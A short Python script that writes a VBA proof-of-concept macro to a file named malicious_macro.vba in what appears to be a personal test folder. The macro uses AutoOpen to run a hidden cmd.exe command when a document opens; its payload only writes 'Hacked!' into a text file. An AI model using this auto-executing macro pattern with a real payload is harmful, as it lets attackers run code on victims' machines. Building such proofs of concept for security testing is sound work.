# Create a vba macro file
# This should pop open a windows cmd when the doc opens

macro_code = """
Sub AutoOpen()
    Dim cmd As String
    cmd = "cmd.exe /c echo Hacked! > C:\\Users\\alasdairTRE\\Desktop\\TestScripts\\poc.txt"
    Shell cmd, vbHide
End Sub
"""

# Save the macro as a .vba file
with open("C:\\Users\\alasdairTRE\\Desktop\\TestScripts\\malicious_macro.vba", "w") as f:
    f.write(macro_code)

print("Macro saved as malicious_macro.vba")